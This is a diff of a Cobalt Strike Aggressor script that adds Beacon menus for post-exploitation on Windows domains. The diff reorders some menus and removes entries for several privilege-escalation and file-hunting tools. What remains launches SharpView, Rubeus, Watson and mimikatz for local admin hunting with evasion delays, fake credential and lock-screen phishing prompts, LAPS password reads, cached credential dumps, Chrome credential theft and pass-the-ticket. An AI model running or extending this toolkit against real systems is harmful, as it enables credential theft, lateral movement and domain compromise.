@@ -4,49 +4,43 @@
 ####################################################
 popup beacon_top {
 	menu "Extension Kit" {
-menu "Got Admin?" {
+menu "Find Admin Access" {
 		item "Find Admin Access - Sneaky"{
 			local('$bid');
 				foreach $bid ($1){
 					sneakyadmin($bid);
 				}
 			}
-			
 		item "Find Admin Access - Loud"{
 			local('$bid');
 				foreach $bid ($1){
 					loudadmin($bid);
 				}
 			}
-			
 		item "Find Admin and Share Access - Sneaky"{
 			local('$bid');
 				foreach $bid ($1){
 					sneakyshare($bid);
 				}
 			}
-			
 		item "Find Admin and Share Access - Sneaky-ISH"{
 			local('$bid');
 				foreach $bid ($1){
 					sneakish($bid);
 				}
 			}
-			
 		item "Find Admin and Share Access - LOUD"{
 			local('$bid');
 				foreach $bid ($1){
 					loudshare($bid);
 				}
 			}
-			
 		item "Find Admin - Sniper Mode"{
 			local('$bid');
 				foreach $bid ($1){
 					snipeaccess($bid);
 				}
 			}
-			
 }
 ####################################################
 ##List All Items in Pop Up Menu
@@ -61,42 +55,35 @@ menu "Domain Group Enumeration"
 					getnetgroupenterpriseadmin($bid);
 				}
 			}
-			
 		item "Domain Admin"{
 			local('$bid');
 				foreach $bid ($1){
 					getnetgroupdomainadmin($bid);
 				}
 			}
-			
 		item "Schema Admin"{
 			local('$bid');
 				foreach $bid ($1){
 					getnetgroupschemaadmin($bid);
 				}
 			}
-		
 		item "Account Operator"{
 			local('$bid');
 				foreach $bid ($1){
 					getnetgroupaccountoperator($bid);
 				}
 			}
-					
-			
 		item "Administrator"{
 			local('$bid');
 				foreach $bid ($1){
 					getnetgroupadministrator($bid);
 				}
 			}
-			
 ##########################################################################################End of menu			
 }
 menu "Domain User Enumeration"
 {
 ########List People in Domain##################
-					
 		item "List Admins in Domain"{
 			local('$bid');
 				foreach $bid ($1){
@@ -104,230 +91,19 @@ menu "Domain User Enumeration"
 				}
 			}
 }
-##############################################################################End of Menu
-menu "Phishing Users"
-{
-########Run CredPhisher##################
-					
-		item "Prompt for Username and Password"{
-			local('$bid');
-				foreach $bid ($1){
-					credphisher($bid);
-				}
-			}
-		
-			
-########Run Lock Screen Phishing Exploit##################
-					
-		item "Show Lockscreen to Phish Password"{
-			local('$bid');
-				foreach $bid ($1){
-					lockscreen($bid);
-				}
-			}
-		
-}
+
+
 ##############################################################################End of Menu
 
-menu "Find Users"
-
-{
-#
-
-		item "Find User Location (Need Read Access to DC)"{
-
-			local('$bid');
-
-				foreach $bid ($1){
-
-					userloc_DA($bid);
-
-				}
-
-			}
-			
-		item "Find User Location (Use Creds)"{
-
-			local('$bid');
-
-				foreach $bid ($1){
-
-					userloc_creds($bid);
-
-				}
-
-			}
-
-
-
-
-#
-}
-
-
-menu "Find Files"
-
-{
-
-######## Find Cloud Credential Files  ##################
-
-		item "Find Cloud Creds"{
-
-			local('$bid');
-
-				foreach $bid ($1){
-
-					cloudcreds($bid);
-
-				}
-
-			}
-
-######## Find Domain Share  ##################
-
-					
-
-		item "Find Domain Shares"{
-
-			local('$bid');
-
-				foreach $bid ($1){
-
-					finddomainshare($bid);
-
-				}
-
-			}
-				
-######## Find Interesting Domain Shares ##################
-
-					
-
-		item "Find Interesting Domain Shares"{
-
-			local('$bid');
-
-				foreach $bid ($1){
-
-					findinterestingdomainsharefile($bid);
-
-				}
-
-			}
-
-######## Find File Servers ##################
-
-		item "Find File Servers"{
-
-			local('$bid');
-
-				foreach $bid ($1){
-
-					getnetfileserver($bid);
-
-				}
-
-			}
-
-}
-
-##############################################################################End of Menu
-menu "Privilege Escalation"
-{
-	
-########Run Watson by Rastamouse##################
-					
-		item "Run Watson to find missing patches"{
-			local('$bid');
-				foreach $bid ($1){
-					escalateprivs($bid);
-				}
-			}
-########Run WinPEAS##################		
-		item "Run WinPEAS to find privilege escalation"{
-			local('$bid');
-				foreach $bid ($1){
-					winpeas($bid);
-				}
-			}
-
-
-########Run SharpUp##################		
-		item "Run SharpUp to find privilege escalation"{
-			local('$bid');
-				foreach $bid ($1){
-					sharpup($bid);
-				}
-			}
-
-
-########Run Sweet Potato##################		
-		item "Run Sweet Potato (IIS Privesc)"{
-			local('$bid');
-				foreach $bid ($1){
-					sweetpotato($bid);
-				}
-			}
-}
-##############################################################################End of Menu
-menu "Domain Computer Object Enumeration"
-{
-	
-########List computers in Domain##################
-					
-		item "List Computers"{
-			local('$bid');
-				foreach $bid ($1){
-					getdomaincomputer($bid);
-				}
-			}
-		
-}
-##############################################################################End of Menu
 menu "Domain/Forest Enumeration"
 {
 ########List Domains/Forest in Domain##################
 ########################## Forests And Trusts ########################## 
 ########Get Forest#######
-		item "List Forest Object"{
+		item "Show Forest Root/Root Domain SID"{
 			local('$bid');
 				foreach $bid ($1){
 					getforest($bid);
-					}
-				}
-########Get Net Forest#######
-		item "List Domains of Forest"{
-			local('$bid');
-				foreach $bid ($1){
-					getnetforest($bid);
-					}
-				}
-########Get Forest Trust#######
-		item "List Forest Trusts"{
-			local('$bid');
-				foreach $bid ($1){
-					getforesttrust($bid);
-					}
-				}
-########Get Net Forest Trust#######
-		item "Enumerate Forest Trusts Of Current Domain"{
-			local('$bid');
-				foreach $bid ($1){
-					getnetforesttrust($bid);
-					}
-				}
-########Get Domain Trust#######
-		item "List All Domiain Trusts"{
-			local('$bid');
-				foreach $bid ($1){
-					getdomaintrust($bid);
-					}
-				}
-########Get Net Domain Trust#######
-		item "Enumerate Domain Trust relationships"{
-			local('$bid');
-				foreach $bid ($1){
-					getnetdomaintrust($bid);
 					}
 				}
 ########Get Forest Domain#######
@@ -337,28 +113,54 @@ menu "Domain/Forest Enumeration"
 					getforestdomain($bid);
 					}
 				}
-########Get Net Forest Domain#######
-		item "Enumerate All Domains for The Current Forest"{
-			local('$bid');
-				foreach $bid ($1){
-					getnetforestdomain($bid);
-					}
-				}
-					
-		
-########Get Domain Security Identifier (SID)#######
-		item "List Domain SID"{
-			local('$bid');
-				foreach $bid ($1){
-					getdomainsid($bid);
-					}
-				}
 }
 ##############################################################################End of Menu
+
+menu "Phishing Users"
+{
+########Run CredPhisher##################
+		item "Prompt for Username and Password"{
+			local('$bid');
+				foreach $bid ($1){
+					credphisher($bid);
+				}
+			}
+########Run Lock Screen Phishing Exploit##################
+		item "Show Lockscreen to Phish Password"{
+			local('$bid');
+				foreach $bid ($1){
+					lockscreen($bid);
+				}
+			}
+}
+##############################################################################End of Menu
+##############################################################################End of Menu
+menu "Privilege Escalation"
+{
+########Run Watson by Rastamouse##################
+		item "Run Watson to find missing patches"{
+			local('$bid');
+				foreach $bid ($1){
+					escalateprivs($bid);
+				}
+			}
+}
+##############################################################################End of Menu
+menu "Domain Computer Object Enumeration"
+{
+########List computers in Domain##################
+		item "List Computers"{
+			local('$bid');
+				foreach $bid ($1){
+					getdomaincomputer($bid);
+				}
+			}
+}
+##############################################################################End of Menu
+
 menu "Trust"
 ########List Trust in Domain##################
 {					
-	
 }
 ##############################################################################End of Menu
 menu "Pass The Ticket"
@@ -377,17 +179,14 @@ menu "Pass The Ticket"
 ##
 ##
 #################
-					
 menu "Credentials and Kerberos"
 {
        item "Read LAPS Password"{
         prompt_text("Computer Name", "", lambda({
                     bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-DomainObject -Identity $1 -Properties ms-mcs-admpwd");
-                  
                 }, $bids => $1));
 			}
 ########Triage Tickets##################
-					
 		item "List Current Kerberos Tickets AKA Triage"{
 			local('$bid');
 				foreach $bid ($1){
@@ -400,7 +199,6 @@ menu "Credentials and Kerberos"
 					lsadumpcache($bid);
 				}
 			}
-			
 		item "Vaulted Cred AKA vaultcmd Windows Creds"{
 			local('$bid');
 				foreach $bid ($1){
@@ -413,21 +211,18 @@ menu "Credentials and Kerberos"
 					webvaultcmd($bid);
 				}
 			}
-			
 		item "Steal Chrome Creds AKA dpapi::chrome"{
 			local('$bid');
 				foreach $bid ($1){
 					dpapichrome($bid);
 				}
 			}
-			
 		item "List Tokens with Mimikatz"{
 			local('$bid');
 				foreach $bid ($1){
 					listtokens($bid);
 				}
 			}
-			
 		item "Elevate your token with mimikatz"{
 			local('$bid');
 				foreach $bid ($1){
@@ -435,8 +230,6 @@ menu "Credentials and Kerberos"
 				}
 			}			
 }
-	
-	
 ################
 ## These last two brackets close out the above functions
 ##
@@ -444,7 +237,6 @@ menu "Credentials and Kerberos"
 ################
 		}
 	}
-  
 ##############################################################################End of All Menus
 ####################################################Begin Defining Variables for functions
 ###########################
@@ -479,41 +271,13 @@ bmimikatz($1, "lsadump::cache");
 sub rubeustriage{
 bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "triage");
 }
-########################## SharpView get current domain's SID
-sub getdomainsid{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainSID");
-}
 ########################## SharpView Get-Forest
 sub getforest{
 bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-Forest");
 }
-########################## SharpView Get-NetForest
-sub getnetforest{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetForest");
-}
-########################## SharpView Get-ForestTrust
-sub getforesttrust{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-ForestTrust");
-}
-########################## SharpView Get-NetForestTrust
-sub getnetforesttrust{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetForestTrust");
-}
-########################## SharpView Get-DomainTrust
-sub getdomaintrust{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainTrust");
-}
-########################## SharpView Get-NetDomainTrust
-sub getnetdomaintrust{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetDomainTrust");
-}
 ########################## SharpView Get-ForestDomain
 sub getforestdomain{
 bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-ForestDomain");
-}
-########################## SharpView Get-NetForestDomain
-sub getnetforestdomain{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetForestDomain");
 }
 ########################## SharpView Get Domain Computers
 sub getdomaincomputer{
@@ -555,36 +319,14 @@ bexecute_assembly($1, script_resource('/exe/WindowsFormsApp9.exe'));
 sub escalateprivs{
 bexecute_assembly($1, script_resource('/exe/Watson.exe'));
 }
-sub winpeas{
-bexecute_assembly($1, script_resource('/exe/winPEASany.exe'));
-}
-########################## SharpView Find Domain Share
-sub finddomainshare{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-DomainShare");
-}
-########################## Cloud Creds
-sub cloudcreds{
-bexecute_assembly($1, script_resource('/exe/SharpCloud.exe'), "all");
-}
-########################## SharpView Find Interesting Domain Shares
-sub findinterestingdomainsharefile{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-InterestingDomainShareFile");
-}
-########################## SharpView Find File Servers
-sub getnetfileserver{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetFileServer");
-}
 ########################## Pass the ticket
 sub passticket{
  # beacon ID
     $bid = $1;
-    
  # command arugement variable  
     $cmdargs = "";
-  
  # Pop Dialog Box and control flow
     $dialog = dialog("Pass The Ticket", %(execmethod => "Execute-Assembly"), lambda({
- 
  # manipulate the first argument depending on the executables command line switch statements
  # manipulate the second argument depending on the expected input format  
         foreach $key => $value ($3){
@@ -606,9 +348,7 @@ sub passticket{
             btask($bid, 'Executing Pass The Ticket via Execute-Assembly');
             bexecute_assembly($bid, script_resource('/exe/Rubeus.exe'), 'asktgt'.$cmdargs.''."/ptt");
         }
-      
     }));
-    
  # Dialog box contents and text boxes mapped to command line argument keys   
     dialog_description($dialog, "**Think with your Tickets, Jimmy!** Use the FQDN for the Domain input!");
     drow_text($dialog, "user",  "User");
@@ -621,7 +361,7 @@ sub sneakyadmin{
 bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -Delay 20");
 }
 sub loudadmin{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-LocalAdminAccess");
+bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess");
 }
 sub sneakyshare{
 bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -CheckShareAccess -Delay 20");
@@ -632,46 +372,8 @@ bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminA
 sub loudshare{
 bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -CheckShareAccess");
 }
-sub sharpup{
-bexecute_assembly($1, script_resource('../exe/SharpUp.exe'));
-}
-sub sweetpotato{
-bexecute_assembly($1, script_resource('exe/SweetPotato.exe'));
-}
 sub snipeaccess{
 prompt_text("Computer Name - FQDN)", "", lambda({
 bexecute_assembly($bids, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -CheckShareAccess -ComputerName $1");
 }, $bids => $1));
 }
-
-#############################################
-##
-##Find User Location Function
-##
-##
-#############################################
-
-sub userloc_creds{
-    $bid = $1;
-    $dialog = dialog("Let's Hunt Users", %(userloc => "", readaccess => "", clearpass => "", execmethod => "Execute-Assembly"), lambda({
-        $cmdargs = "";
-        $cmdargs = "$3['userloc'] $3['readaccess'] $3['clearpass']";
-        if ($3["execmethod"] eq "Execute-Assembly"){
-            btask($bid, 'Attempting to Locate User');
-            bexecute_assembly($bid, script_resource('../exe/SharpSniper.exe'), $cmdargs);
-        }
-    }));
-    dialog_description($dialog, "You can't use FQDN, You need cleartext creds for someone with read access to the Domain Controller");
-    drow_text($dialog, "userloc",  "User to Locate");
-    drow_text($dialog, "readaccess",  "User w/DC Read Access");
-    drow_text($dialog, "clearpass",  "Cleartext Password");
-    dbutton_action($dialog, "Run");
-	dialog_show($dialog);
-}
-
-#############################################
-##
-##End User Location Function
-##
-##
-#############################################
